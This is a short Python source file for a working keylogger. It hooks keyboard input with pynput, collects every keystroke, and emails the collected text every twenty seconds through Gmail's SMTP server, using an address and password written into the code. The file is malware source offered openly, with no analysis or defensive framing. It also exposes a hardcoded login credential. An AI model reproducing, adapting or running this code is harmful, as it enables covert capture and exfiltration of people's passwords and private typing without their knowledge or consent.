from pynput.keyboard import Listener
import smtplib
from threading import Timer
from datetime import datetime

interval_Between_Sends = 20
email_address = "sendKeyloggerLogs@gmail.com"
password = "!Havenotyetbeguntofight$"
allTheKeystrokes="this is a test"


def keylogger(keystroke):
    global allTheKeystrokes
    keystroke = str(keystroke)

    if keystroke =='Key.space':
        keystroke = ' '
    elif keystroke =='Key.shift_r':
        keystroke = ''
    elif keystroke == 'Key.enter':
        keystroke = '\n'
    print(keystroke)
    allTheKeystrokes+=keystroke


def emailLogs():
    global allTheKeystrokes
    server = smtplib.SMTP(host="smtp.gmail.com", port=587)
    server.starttls()
    server.login(email_address,password)
    server.sendmail(email_address, email_address, allTheKeystrokes)
    server.quit()   
    allTheKeystrokes=""
    Timer(interval_Between_Sends,emailLogs).start()

def other():
    print("this works")
    Timer(interval_Between_Sends,emailLogs).start()


Timer(interval_Between_Sends,emailLogs).start()
with Listener(on_press=keylogger) as l:
    l.join()

# listener = Listener(
#     on_press=keylogger)
# listener.start()
    
